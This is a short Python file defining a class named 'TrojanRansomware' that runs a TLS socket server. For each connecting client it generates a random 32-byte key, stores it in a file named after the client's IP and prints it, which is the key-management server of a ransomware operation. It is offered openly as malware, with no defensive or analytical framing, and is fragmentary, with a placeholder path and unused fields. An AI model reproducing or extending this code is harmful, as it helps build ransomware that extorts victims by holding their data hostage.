import os
import ssl
import socket

class TrojanRansomware:
    def __init__(self, random_key=None):
        self.key = random_key
        self.iv = b""

    def generatekey(self, client_ip):
        random_key = os.urandom(32)
        with open("/path/to/key/file/{}".format(client_ip), 'wb') as key_file:
            key_file.write(random_key)
        return random_key

    def start_server(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind(("127.0.0.1", 8080))
        server_socket.listen(1)
        print("Server is listening")

        while True:
            con, addr = server_socket.accept()
            print(f"Connection accepted from {addr}")
            ssl_socket = ssl.wrap_socket(con, server_side=True, certfile="server.crt", keyfile="server.key")
            ip, port = ssl_socket.getpeername()
            random_key = self.generatekey(ip)
            print(f"Generated key for {ip}: {random_key}")